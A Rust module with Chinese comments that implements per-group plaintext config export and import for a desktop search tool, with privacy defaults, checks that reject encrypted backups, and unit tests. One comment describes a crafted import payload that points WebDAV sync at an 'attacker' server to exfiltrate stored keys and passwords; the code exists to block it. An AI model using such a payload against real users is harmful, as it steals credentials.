/*! r54 需求 3：**明文**配置的按项导出 / 导入。

# 这一轮要的东西（用户原话）

> 「三、数据导入导出：新增导入导出功能。导出时提供数据项勾选界面，可选项包括
> API Key、引擎配置、应用设置等，默认仅勾选非隐私内容；导出的配置数据不加密，
> 可直接被他人导入恢复；备份功能单独存在且支持加密；导入功能仅支持直接恢复
> 导出的明文数据，不支持导入加密备份。」

四个要求，逐条落在哪里：

| 要求 | 落点 |
| --- | --- |
| 导出有勾选界面 | 前端 `renderExportBox()`（数据栏那张复选表），选项从 `export_items()` 拿 |
| 可选项含 API Key / 引擎配置 / 应用设置 | `GROUPS` 表，八项 |
| **默认只勾非隐私** | `Group::default_checked` 字段 |
| 导出的不加密、可直接导入 | `export_items` 不做 `crypto::encrypt` |
| 备份另存在、且加密 | 那是 `export_config` / `import_config` 那条老路，**这里一行都没动** |
| 导入只吃明文，不吃加密备份 | `import_items` 里 `crypto::looks_encrypted` 挡掉 |

# 为什么明文和备份必须分成两个入口

备份（`.QuickSearch`）是**整份配置 + 可选加密**，恢复时是"全量覆盖式"的
（`apply_view` 把认识的键全灌回去）。明文导出是**挑几项 + 合并式**的 ——
用户只想把"我的搜索引擎勾选"给同事，不想连收藏夹、WebDAV 密码一起给。

把这两件事塞进同一个文件格式会立刻出乱子：同一个 `barList` 键，在备份里是
"整份替换"，在明文导出里是"只换这一项"。格式不分，语义就没法分。所以：

* 备份文件：裸 `config_view()` 形状的 JSON（或加密文本）→ `restore_from_text`
* 明文导出：`{kind:"qs-config", items:[...], data:{...}}` → `import_items`

两者靠 `kind` 一眼分得开，`import_items` **明确拒绝**加密备份（不是"试一下
能不能解"，是"这份文件不是明文导出格式"），免得用户把加密备份拖到明文导入
里收到一句看不懂的报错。

# 导出文件里的 `data` 是什么

就是 `config_view()` 的**子集**（只留勾中组涉及的键）。形状与 config_view
一致是有意的：导入侧直接复用 `apply_view` 那套解析（同样的 clamp、同样的
默认值），两边不会各写一套"这个键怎么读"的规则。
*/

use crate::crypto;
use serde_json::{json, Value};

/// 一组可勾选的导出项。
///
/// `keys` 是 **config_view() 里的键名**（camelCase），不是 Config 字段名 ——
/// 这样导出内容与前端看到的那份配置严格同形，导入侧也能直接喂给 `apply_view`。
pub struct Group {
    /// 组的 id（勾选界面回传的就是这个）
    pub id: &'static str,
    /// 界面上的标题
    pub name: &'static str,
    /// 一句话说明这项装了什么、给谁用
    pub desc: &'static str,
    /// 这个组涉及 config_view 的哪些键
    pub keys: &'static [&'static str],
    /// **隐私**项。隐私项默认**不勾**，界面标黄。
    ///
    /// 判据（用户口径「默认仅勾选非隐私内容」）：凭据、密码、收藏夹内容、
    /// 备份目标地址 —— 这些给别人会直接造成账号/隐私风险。
    pub private: bool,
    /// 默认要不要勾上
    pub default_checked: bool,
}

/// 八组导出项。
///
/// ⚠ 一张表同时服务三处：设置页的勾选界面、`export_items` 的键裁剪、
///    `import_items` 的合法性校验。**加一组只改这里**，界面和后端自动跟上
///    （与 `imgsearch::ENGINES` / `ocr_engines::ENGINES` 同一个套路）。
pub static GROUPS: &[Group] = &[
    Group {
        id: "apiKeys",
        name: "API Key / 凭据",
        desc: "各识别引擎的 Key、Secret、模型名。给了别人 = 把你的额度给了别人",
        keys: &["ocrKey", "ocrSecret", "ocrCreds"],
        private: true,
        default_checked: false,
    },
    Group {
        id: "engineConfig",
        name: "引擎配置",
        desc: "横条摆哪些引擎、顺序、分隔线、自定义引擎、搜索地址覆盖、AI 提问后缀",
        keys: &[
            "barList",
            "sepStyle",
            "lastEngine",
            "customEngines",
            "urlOverrides",
            "aiSuffix",
            "aiSuffixes",
            "aiCopyPrompt",
        ],
        private: false,
        default_checked: true,
    },
    Group {
        id: "appSettings",
        name: "应用设置",
        desc: "外观（图标大小、透明度、圆角、主题、玻璃、磨砂）与行为（触发方式、延时、生效范围）",
        keys: &[
            "triggerSelect",
            "triggerCopy",
            "anchorAtMouse",
            "autoStart",
            "autoElevate",
            "iconSize",
            "alpha",
            "barDimAlpha",
            "barGlass",
            "barGlassRefraction",
            "barGlassBevel",
            "barGlassFrost",
            "barGlassAberration",
            "barGlassSpec",
            "barGlassTint",
            "barGlassLive",
            "iconStyle",
            "unifyIcons",
            "barPadding",
            "itemRadius",
            "theme",
            "animations",
            "shadow",
            "barBlur",
            "delayMs",
            "filterMode",
            "filterList",
        ],
        private: false,
        default_checked: true,
    },
    Group {
        id: "favorites",
        name: "收藏夹",
        desc: "收藏的目录、文字与图片内容、唤起快捷键、面板尺寸",
        keys: &["favorites", "favHotkey", "favPanelSizes"],
        private: true,
        default_checked: false,
    },
    Group {
        id: "icons",
        name: "自定义图标",
        desc: "给引擎换过的图标图片（内嵌在文件里，不依赖外部图片路径）",
        keys: &["overrideIcons", "dirIcons"],
        private: false,
        default_checked: true,
    },
    Group {
        id: "hotkeys",
        name: "快捷键",
        desc: "唤起收藏夹的按键（目前只有这一项）",
        keys: &["favHotkey"],
        private: false,
        default_checked: false,
    },
    Group {
        id: "backupSettings",
        name: "备份设置",
        desc: "WebDAV 地址/账号/密码、备份目录。密码给别人 = 把网盘给了别人",
        keys: &[
            "backupPassword",
            "backupDir",
            "webdavUrl",
            "webdavUser",
            "webdavPass",
            "webdavOnStart",
            "webdavOnExit",
        ],
        private: true,
        default_checked: false,
    },
    Group {
        id: "imgsearch",
        name: "识图搜索",
        desc: "识图引擎勾选、默认引擎、公网图片地址",
        keys: &["imgEnable", "imgAddToBar", "imgDefaultEngine", "imgEngines", "imgPublicUrl"],
        private: false,
        default_checked: true,
    },
];

/// 明文导出的文件头标记。
///
/// 导入侧靠它区分「明文导出」和「整份备份（可能是加密的）」。选这个串而不
/// 是 `version` 之类：老备份里也有 `version`，光看那个分不出来。
pub const EXPORT_KIND: &str = "qs-config";

/// 按组 id 找一组（界面回传的 id 直接拿来查）。
pub fn find_group(id: &str) -> Option<&'static Group> {
    GROUPS.iter().find(|g| g.id == id)
}

/// 给前端的勾选表：八组的说明 + 隐私标记 + **默认勾选状态**。
///
/// 界面只负责画，默认值由这里定 —— 与「默认仅勾选非隐私内容」这条要求只有
/// 一个出处，改口径只改 `Group::default_checked`。
pub fn items() -> Value {
    let list: Vec<Value> = GROUPS
        .iter()
        .map(|g| {
            json!({
                "id": g.id,
                "name": g.name,
                "desc": g.desc,
                "private": g.private,
                "checked": g.default_checked,
            })
        })
        .collect();
    json!(list)
}

/// 从整份 config_view 里**只裁**出勾中的那些键。
///
/// * 界面传上来的组 id 一律先过 `find_group`：不认识的 id 直接丢，绝不当成
///   "全都要"（否则一个手写的 / 老版本的界面就能勾出全量导出，绕过"默认
///   只勾非隐私"这条设计）。
/// * 一个键被多组共用时（`favHotkey` 同时属于收藏夹与快捷键）取并集，
///   任一组勾了它就导出。
/// * 勾了但 config_view 里没有的键（老版本配置没这个字段）不会出现 ——
///   导入侧看到"键不在"，按"这一项没有数据"跳过即可，不会报错。
pub fn filter_keys(items: &[String]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for id in items {
        let Some(g) = find_group(id) else {
            continue;
        };
        for k in g.keys {
            if !out.iter().any(|x| x == k) {
                out.push((*k).to_string());
            }
        }
    }
    out
}

/// 生成明文导出的内容（不含文件头元数据）。
///
/// 返回 `(元数据, data)`：调用方把两者拼成文件内容写出去。
/// 单独返回 data 是为了让导入侧的解析能直接拿它喂 `apply_view`。
pub fn build(view: &Value, items: &[String]) -> (Value, Value) {
    let keys = filter_keys(items);
    let mut data = serde_json::Map::new();
    for k in &keys {
        if let Some(v) = view.get(k) {
            data.insert(k.clone(), v.clone());
        }
    }
    (
        json!({
            "kind": EXPORT_KIND,
            "items": items,
            // 导出时刻（unix 秒）。导入界面显示"这份配置是什么时候导出的"，
            // 方便判断新旧。
            "at": std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs() as i64)
                .unwrap_or(0),
        }),
        Value::Object(data),
    )
}

/// 把挑中的组写成一份**明文** `.qsconf`。返回写进去的设置项个数。
///
/// 这是 `export_items` 命令真正干活的那一半（命令自己只负责弹对话框）——
/// 拆出来的理由写在 main.rs 那个函数的注释里：纯逻辑才能被单测覆盖，
/// 而"导出 → 落盘 → 再导入"这条链路是真机探针够不到的地方（原生文件对话框
/// 不接受注入的按键）。
pub fn write_plain(
    path: &std::path::Path,
    items: &[String],
    view: &Value,
) -> Result<usize, String> {
    let (meta, data) = build(view, items);
    let n_keys = data.as_object().map(|o| o.len()).unwrap_or(0);
    let mut file = meta;
    if let Value::Object(o) = &mut file {
        o.insert("data".into(), data);
    }
    let text = serde_json::to_string_pretty(&file)
        .map_err(|e| format!("序列化失败：{e}"))?;
    std::fs::write(path, text).map_err(|e| format!("写入失败：{e}"))?;
    Ok(n_keys)
}

/// 读一份明文导出，返回勾了哪些组 + 数据。三道闸都在 `parse` 里。
///
/// `max_bytes` 与备份那条路一致（32MB）：**读之前**就看大小 —— 拿一个 2GB 的
/// 文件去 `read_to_string` 能把内存吃光，先 `metadata` 一下几乎不要钱。
pub fn read_plain(
    path: &std::path::Path,
    max_bytes: u64,
) -> Result<(Vec<String>, Value), String> {
    match std::fs::metadata(path) {
        Ok(m) if m.len() > max_bytes => {
            return Err("文件超过 32MB，确认选对了吗".to_string());
        }
        _ => {}
    }
    let text = std::fs::read_to_string(path)
        .map_err(|e| format!("文件读不出来：{e}"))?;
    parse(&text)
}

/// 读一份明文导出，返回其中**勾过哪些组**与数据。
///
/// 三道闸，全部是"宁可拒绝也别冲掉用户配置"：
///
/// 1. **加密备份直接拒**（用户原话：导入仅支持明文，不支持加密备份）。
///    不尝试解密、不提示"要不要输密码" —— 那条路在「备份」页，这里只负责明文。
/// 2. `kind` 必须是 `qs-config`。整份备份（裸 config_view 形状）没有这个字段，
///    照样拒：全量恢复是备份页的事，明文导入不该悄悄变成全量覆盖。
/// 3. `items` 必须是字符串数组。别的类型（对象 / 数字）说明文件被改过，
///    宁可拒绝也不要猜。
pub fn parse(text: &str) -> Result<(Vec<String>, Value), String> {
    if crypto::looks_encrypted(text) {
        return Err("这是加密备份，明文导入用不了 —— 请到「备份」页恢复，或让导出方导出明文".into());
    }
    let v: Value =
        serde_json::from_str(text).map_err(|e| format!("文件内容不是有效的 JSON：{e}"))?;
    let Some(kind) = v.get("kind").and_then(|x| x.as_str()) else {
        return Err("这份文件不是明文导出的配置（缺少 kind 字段）—— 若它是备份文件，请去「备份」页".into());
    };
    if kind != EXPORT_KIND {
        return Err(format!("不支持的文件类型：{kind}"));
    }
    let items = match v.get("items") {
        Some(Value::Array(a)) => a
            .iter()
            .filter_map(|x| x.as_str().map(|s| s.to_string()))
            .collect::<Vec<_>>(),
        _ => return Err("导出文件的 items 字段不对（应当是字符串数组）".into()),
    };
    let Some(data) = v.get("data").and_then(|x| x.as_object()) else {
        return Err("导出文件的 data 字段缺失".into());
    };
    if data.is_empty() {
        return Err("这份导出里没有任何数据（导出时大概什么都没勾）".into());
    }
    // 只保留认得的组 —— 别的组对 apply_view 没意义，留着只是噪声
    let known: Vec<String> = items.into_iter().filter(|i| find_group(i).is_some()).collect();
    /* ⚠ 必须**按勾选的组裁剪 data**，不能原样把整份 data 交给 apply_view。
     *
     * apply_view 认得 webdavUrl / webdavUser / webdavPass / webdavOnStart /
     * webdavOnExit —— 一份 `{"kind":"qs-config","items":["appSettings"],
     * "data":{"webdavUrl":"https://attacker/dav/","webdavPass":"x",
     * "webdavOnStart":true}}` 就能在用户只勾了"应用设置"的情况下，把同步目标
     * 换成别人的服务器，下次启动/退出时把**含 OCR Key 和备份密码的整份配置**
     * 推上去。用户看到的只是一次正常的明文导入。
     *
     * 裁剪口径和 `export_items` 完全对称：只取勾中组声明过的键。
     * 唯一的例外是 `dirIcons` —— 它跟着 `overrideIcons` 一起导出的图片，
     * 导入侧目前没有落盘实现（见 apply_view），所以这里**不**为它放行。 */
    let allow = allow_keys(&known);
    let mut kept = serde_json::Map::new();
    for (k, v) in data {
        if allow.contains(k.as_str()) {
            kept.insert(k.clone(), v.clone());
        }
    }
    if kept.is_empty() {
        return Err("勾选的这些组里没有任何可导入的字段（文件可能被改过）".into());
    }
    Ok((known, Value::Object(kept)))
}

/// 勾中的那些组一共允许哪些键（与 [`export_items`] 的裁剪口径对称）。
fn allow_keys(items: &[String]) -> std::collections::HashSet<&'static str> {
    let mut out = std::collections::HashSet::new();
    for id in items {
        if let Some(g) = find_group(id) {
            for k in g.keys {
                // dirIcons 只导出不导入（导入侧没有图标落盘实现），别放它过去
                if *k == "dirIcons" {
                    continue;
                }
                out.insert(*k);
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_view() -> Value {
        json!({
            "barList": ["@ocr", "baidu"],
            "theme": "dark",
            "ocrKey": "SECRETKEY",
            "favorites": [{"id": "g1", "title": "日常", "items": []}],
        })
    }

    /// 把导出元数据与数据拼成完整的文件内容（测试里用，跟后端写盘同一形状）
    fn merge(meta: Value, data: Value) -> Value {
        let mut m = meta;
        if let Value::Object(o) = &mut m {
            o.insert("data".into(), data);
        }
        m
    }

    #[test]
    fn 默认只勾非隐私() {
        // 用户口径：「默认仅勾选非隐私内容」
        let default_on: Vec<&str> = GROUPS.iter().filter(|g| g.default_checked).map(|g| g.id).collect();
        for id in ["apiKeys", "favorites", "backupSettings"] {
            assert!(!default_on.contains(&id), "隐私项 {id} 不该默认勾选");
        }
        for id in ["engineConfig", "appSettings", "icons", "imgsearch"] {
            assert!(default_on.contains(&id), "常用项 {id} 应当默认勾选");
        }
    }

    #[test]
    fn 勾中的键才导出() {
        let (_, data) = build(&sample_view(), &["engineConfig".to_string()]);
        assert!(data.get("barList").is_some());
        assert!(data.get("theme").is_none(), "应用设置没勾，不该带上");
        assert!(data.get("ocrKey").is_none(), "凭据没勾，绝不能带上");
    }

    #[test]
    fn 认不出的组被忽略() {
        // 手写一个假组 id 进来，不能变成"全量导出"
        let (_, data) = build(
            &sample_view(),
            &["engineConfig".to_string(), "__all__".to_string(), "".to_string()],
        );
        assert!(data.get("barList").is_some());
        assert!(data.get("ocrKey").is_none());
        assert!(data.get("favorites").is_none());
    }

    #[test]
    fn 共用键取并集() {
        // favHotkey 同时属于「收藏夹」与「快捷键」：任一组勾了就导出
        let v = json!({"favHotkey": "Ctrl+Alt+F"});
        let (_, a) = build(&v, &["favorites".to_string()]);
        assert!(a.get("favHotkey").is_some());
        let (_, b) = build(&v, &["hotkeys".to_string()]);
        assert!(b.get("favHotkey").is_some());
    }

    #[test]
    fn 加密备份被明文导入拒绝() {
        let enc = crypto::encrypt(r#"{"kind":"qs-config"}"#, "pw").unwrap();
        let e = parse(&enc).unwrap_err();
        assert!(e.contains("加密备份"), "报错要说清是加密备份：{e}");
    }

    #[test]
    fn 整份备份也被拒绝() {
        // 裸 config_view 形状（没有 kind）—— 全量恢复是备份页的事
        let e = parse(&serde_json::to_string(&sample_view()).unwrap()).unwrap_err();
        assert!(e.contains("不是明文导出"), "报错要说清不是明文导出：{e}");
    }

    #[test]
    fn 走一圈导出再导入() {
        let (meta, data) = build(&sample_view(), &["engineConfig".to_string()]);
        let file = merge(meta, data);
        let text = serde_json::to_string(&file).unwrap();
        let (items, got) = parse(&text).unwrap();
        assert_eq!(items, vec!["engineConfig".to_string()]);
        assert_eq!(got.get("barList").unwrap(), &json!(["@ocr", "baidu"]));
    }

    #[test]
    fn 空导出被拒() {
        // 什么都没勾 → data 空 → 拒绝。放行的话用户会以为导入成功了
        let (meta, data) = build(&sample_view(), &[]);
        let e = parse(&serde_json::to_string(&merge(meta, data)).unwrap()).unwrap_err();
        assert!(e.contains("没有任何数据"), "报错要说明是空的：{e}");
    }

    #[test]
    fn 组id唯一() {
        for (i, a) in GROUPS.iter().enumerate() {
            for b in GROUPS.iter().skip(i + 1) {
                assert_ne!(a.id, b.id, "组 id 重复：{}", a.id);
            }
            assert!(!a.keys.is_empty(), "组 {} 没有任何键", a.id);
            assert!(!a.name.is_empty());
        }
    }

    /* ---- 真磁盘往返：write_plain → read_plain ----
     *
     * 这一组补的是 `export_items` / `import_items` 两条命令**真正干活的那一半**
     * （命令自己是弹对话框的薄壳，见 main.rs 那两个函数的注释）。为什么值得
     * 单独写：真机探针够不到原生文件对话框（文件名框拿不到键盘焦点，注入的
     * 按键全被吃掉，白跑三轮），而"导出的文件能再导回来"是用户原话里的硬
     * 要求 —— 这条路不走磁盘单测就没人证。 */

    /// 落一个临时文件路径（不创建文件）。测试之间撞名会让断言互相污染，
    /// 所以每个用例一条独立路径（测试名 + 纳秒时间戳）。
    fn tmp_file(name: &str) -> std::path::PathBuf {
        let n = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        std::env::temp_dir().join(format!("qs-export-test-{name}-{n}.qsconf"))
    }

    #[test]
    fn 落盘再读回来键不丢() {
        let p = tmp_file("roundtrip");
        let view = sample_view();
        let n = write_plain(&p, &["engineConfig".to_string()], &view).unwrap();
        assert!(n > 0, "至少写进去一个键");
        // 文件必须是**明文**：人 / JSON 解析器都读得出来（用户原话：不加密）
        let text = std::fs::read_to_string(&p).unwrap();
        let j: Value = serde_json::from_str(&text).expect("导出的必须是明文 JSON");
        assert_eq!(j["kind"], json!(EXPORT_KIND));
        assert_eq!(j["items"], json!(["engineConfig"]));

        let (items, data) = read_plain(&p, 32 * 1024 * 1024).unwrap();
        assert_eq!(items, vec!["engineConfig".to_string()]);
        assert_eq!(data.get("barList").unwrap(), &json!(["@ocr", "baidu"]));
        assert!(data.get("ocrKey").is_none(), "凭据没勾，文件里不该有");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 落盘的文件不是密文() {
        // 备份那条路设了密码就是 AES-GCM 密文；明文这条路**一个字都不碰加密**
        let p = tmp_file("plain");
        write_plain(&p, &["appSettings".to_string()], &sample_view()).unwrap();
        let raw = std::fs::read(&p).unwrap();
        assert!(!crypto::looks_encrypted(
            &String::from_utf8_lossy(&raw)
        ), "明文导出一眼就能被 looks_encrypted 当成密文，说明格式走错了");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 落盘的加密备份读不进来() {
        // 拿一份**真的**加密备份文件去 read_plain，应当被拒并指路「备份」页
        let p = tmp_file("encrypted");
        let text = crypto::encrypt(&serde_json::to_string(&sample_view()).unwrap(), "pw").unwrap();
        std::fs::write(&p, text).unwrap();
        let e = read_plain(&p, 32 * 1024 * 1024).unwrap_err();
        assert!(e.contains("加密备份"), "报错要说清是加密备份：{e}");
        assert!(e.contains("备份"), "报错要指路备份页：{e}");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 超过体积上限直接拒() {
        // 读之前就拦：不能让一个巨型文件把内存吃光。
        // ⚠ 上限传 0 而不是 1：判定是 `len > max_bytes`，1 字节的文件
        //   （1 > 1 为假）会走到解析那一步，报的错就成了"不是 JSON"而不是
        //   "太大"，那就没测到体积那道闸了。
        let p = tmp_file("toobig");
        std::fs::write(&p, "x").unwrap();
        let e = read_plain(&p, 0).unwrap_err();
        assert!(e.contains("32MB"), "报错要说明是体积问题：{e}");
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn 落盘后合并导入不覆盖别人的键() {
        // 合并语义的关键证据：同一份文件灌进两份不同配置，各自的独有键都还在。
        // （apply_view 只在 main.rs 里，这里验到"读出来的只有那几项"——
        //  灌回去只碰这几项，剩下的键自然原样不动。）
        let p = tmp_file("merge");
        let view = json!({"barList": ["@ocr"], "theme": "dark"});
        let n = write_plain(&p, &["engineConfig".to_string()], &view).unwrap();
        assert_eq!(n, 1, "barList 一个键");
        let (_, data) = read_plain(&p, 32 * 1024 * 1024).unwrap();
        assert_eq!(data.as_object().unwrap().len(), 1, "只该带 barList");
        assert!(data.get("theme").is_none(), "application settings 没勾 → 不带 theme");
        let _ = std::fs::remove_file(&p);
    }
}
